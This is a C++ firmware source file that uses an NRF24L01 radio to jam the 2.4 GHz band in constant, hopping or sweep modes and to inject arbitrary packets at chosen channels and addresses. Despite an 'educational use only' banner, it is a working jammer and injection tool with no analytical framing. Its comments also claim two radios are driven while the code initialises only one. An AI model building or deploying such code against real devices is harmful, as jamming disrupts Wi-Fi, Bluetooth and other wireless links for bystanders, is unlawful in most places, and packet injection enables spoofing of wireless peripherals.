/*
 * packet_injection.cpp — NRF24L01 2.4 GHz jamming & packet injection
 *
 * ================================================================
 *  ⚠ EDUCATIONAL / DEFENSIVE RESEARCH USE ONLY
 *  This code is for authorized lab testing and defensive
 *  cybersecurity education in controlled environments.
 * ================================================================
 *
 * Uses NRF24L01 modules #2 and #3 (HSPI bus) to flood the 2.4 GHz
 * band with noise.  Three jamming modes are supported:
 *   1. CONSTANT — Continuous TX on a single channel
 *   2. HOPPING  — Rapidly hop across channel range while TX
 *   3. SWEEP    — Sequential sweep across all channels
 *
 * Module #2 and #3 share the HSPI bus with different CSN pins,
 * allowing simultaneous control via chip-select toggling.
 */

#include "packet_injection.h"

static RF24 _radio(NRF1_CE, NRF1_CSN);

static NrfJamState _state = NJAM_IDLE;
static NrfJamMode  _mode  = NJAM_MODE_HOPPING;
static uint8_t  _startCh = 0;
static uint8_t  _endCh   = 125;
static uint8_t  _currentCh = 0;
static uint32_t _txCount = 0;
static unsigned long _lastTx = 0;
static bool _radioOk = false;

// Noise payload — random-looking data to maximize spectral spread
static const uint8_t _noisePayload[32] = {
  0xAA, 0x55, 0xAA, 0x55, 0xDE, 0xAD, 0xBE, 0xEF,
  0x13, 0x37, 0xCA, 0xFE, 0xBA, 0xBE, 0xF0, 0x0D,
  0xFF, 0x00, 0xFF, 0x00, 0xA5, 0x5A, 0x69, 0x96,
  0xC3, 0x3C, 0x0F, 0xF0, 0x12, 0x34, 0x56, 0x78
};

// Broadcast-like address (all pipes listening)
static const uint8_t _jamAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

/*
 * _initRadio()
 * Common initialization for a jammer radio.
 */
static bool _initRadio(RF24& radio, const char* label) {
  SPI.begin();
  if (!radio.begin()) {
    DBGF("[NRF] %s NOT detected\n", label);
    return false;
  }
  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  radio.setDataRate(NRF_JAM_RATE);
  radio.setPALevel(NRF_JAM_POWER);
  radio.setPayloadSize(32);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.openWritingPipe(_jamAddr);
  radio.stopListening();
  DBGF("[NRF] %s initialized (jam mode)\n", label);
  return true;
}

bool packet_injection_init() {
  _radioOk = _initRadio(_radio, "Module #1");
  DBGLN(F("[NRF] Packet injection subsystem ready"));
  return _radioOk;
}

bool packet_injection_getRadio2Ok() {
  return _radioOk;
}

bool packet_injection_getRadio3Ok() {
  return false;
}

/*
 * packet_injection_jam_start()
 * Begin jamming across the specified channel range.
 */
void packet_injection_jam_start(uint8_t startCh, uint8_t endCh, NrfJamMode mode) {
  _startCh  = constrain(startCh, 0, 125);
  _endCh    = constrain(endCh, _startCh, 125);
  _mode     = mode;
  _currentCh = _startCh;
  _txCount   = 0;
  _lastTx    = 0;
  _state     = NJAM_RUNNING;

  DBGF("[NRF] Jam started: ch%d-%d  mode=%d\n", _startCh, _endCh, _mode);
}

void packet_injection_jam_stop() {
  if (_radioOk) _radio.stopListening();
  _state = NJAM_STOPPED;
  DBGF("[NRF] Jam stopped. TX count: %lu\n", _txCount);
}

/*
 * _txNoise()
 * Sends the noise payload on the given channel using both radios.
 */
static void _txNoise(uint8_t ch) {
  if (_radioOk) {
    _radio.setChannel(ch);
    _radio.write(_noisePayload, 32, true);  // true = no-ACK
  }
  _txCount++;
}

/*
 * packet_injection_update()
 * Non-blocking jam loop — transmits noise per the selected mode.
 */
void packet_injection_update() {
  if (_state != NJAM_RUNNING) return;

  switch (_mode) {
    case NJAM_MODE_CONSTANT:
      // Transmit continuously on _startCh
      _txNoise(_startCh);
      break;

    case NJAM_MODE_HOPPING:
      // Rapid random hopping within range
      {
        uint8_t ch = random(_startCh, _endCh + 1);
        _txNoise(ch);
      }
      break;

    case NJAM_MODE_SWEEP:
      // Sequential sweep
      _txNoise(_currentCh);
      _currentCh++;
      if (_currentCh > _endCh) _currentCh = _startCh;
      break;
  }
}

NrfJamState packet_injection_getState() {
  return _state;
}

uint32_t packet_injection_getTxCount() {
  return _txCount;
}

/*
 * packet_injection_send()
 * Inject a custom payload on a specific channel and address.
 * Uses radio #2.  Returns true if write was acknowledged
 * (auto-ack is off, so this is best-effort).
 */
bool packet_injection_send(uint8_t channel, const uint8_t addr[5],
                           const uint8_t* payload, uint8_t len) {
  if (!_radioOk) return false;

  _radio.setChannel(channel);
  _radio.openWritingPipe(addr);
  _radio.setPayloadSize(len);
  bool ok = _radio.write(payload, len, true);

  // Restore jam address
  _radio.openWritingPipe(_jamAddr);
  _radio.setPayloadSize(32);

  DBGF("[NRF] Custom inject ch%d len=%d ok=%d\n", channel, len, ok);
  _txCount++;
  return ok;
}
